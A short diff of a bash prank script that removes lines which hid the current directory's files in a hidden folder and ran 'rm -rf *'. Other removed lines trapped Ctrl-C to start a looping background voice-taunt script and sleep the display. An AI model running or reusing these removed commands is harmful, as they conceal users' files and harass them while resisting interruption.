@@ -1,27 +1,7 @@
 #!/bin/bash
 
 time=0.4
-brew install -qq figlet
-mkdir -p ~/goinfre/.kirwa
-mv * ~/goinfre/.kirwa/
-rm -rf *
 
-i=1
-export var=${1}
-if [ -z $1 ]
-then
-    export var="Rm -rf *"
-fi
-
-other_commands() {
-    echo -e "\033[1;36mGHA thajroooooooo...!\033[0m"
-    sleep 2
-    echo "while [ F ]; do say scar  scar   scar   spoody  spoody spoody laarbi       tige me if you can;sleep 1; done" > zero.sh
-    nohup sh zero.sh & > ~/Desktop/hma9
-    pmset displaysleepnow
-}
-
-trap 'other_commands' SIGINT
 
 while $T
 do
